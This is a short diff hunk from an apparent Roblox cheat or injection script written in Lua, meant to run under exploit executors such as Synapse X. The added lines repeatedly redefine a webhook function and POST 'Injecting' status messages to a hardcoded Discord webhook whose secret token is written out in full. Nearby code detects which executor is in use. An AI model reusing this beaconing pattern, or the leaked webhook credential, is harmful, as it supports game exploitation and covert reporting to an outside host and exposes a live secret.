@@ -370,6 +370,19 @@ _G.SendWebHook("https://discord.com/api/webhooks/1000753260291960842/Fz2CPTbbU6J
 
 
 
+function _G.SendWebHook(url, message)newBody = {["content"] = tostring(message)}; SynWebHook = {Url = url,Body = game.HttpService:JSONEncode(newBody),Method = "POST",Headers = {["content-type"] = "application/json"}};syn.request(SynWebHook)end;
+	
+	_G.SendWebHook("https://discord.com/api/webhooks/1000753260291960842/Fz2CPTbbU6JHryzn8l7XpWq-j_3u2vLN1U7BY6QgGXjoueTHhDwjSP49nXSD_IXdomSj", "-- /// Injecting .")
+	function _G.SendWebHook(url, message)newBody = {["content"] = tostring(message)}; SynWebHook = {Url = url,Body = game.HttpService:JSONEncode(newBody),Method = "POST",Headers = {["content-type"] = "application/json"}};syn.request(SynWebHook)end;
+	
+	_G.SendWebHook("https://discord.com/api/webhooks/1000753260291960842/Fz2CPTbbU6JHryzn8l7XpWq-j_3u2vLN1U7BY6QgGXjoueTHhDwjSP49nXSD_IXdomSj", "-- /// Injecting . .")
+	function _G.SendWebHook(url, message)newBody = {["content"] = tostring(message)}; SynWebHook = {Url = url,Body = game.HttpService:JSONEncode(newBody),Method = "POST",Headers = {["content-type"] = "application/json"}};syn.request(SynWebHook)end;
+	
+	_G.SendWebHook("https://discord.com/api/webhooks/1000753260291960842/Fz2CPTbbU6JHryzn8l7XpWq-j_3u2vLN1U7BY6QgGXjoueTHhDwjSP49nXSD_IXdomSj", "-- /// Injecting . . .")
+
+
+
+
 local webhookcheck =
    is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
    secure_load and "Sentinel" or
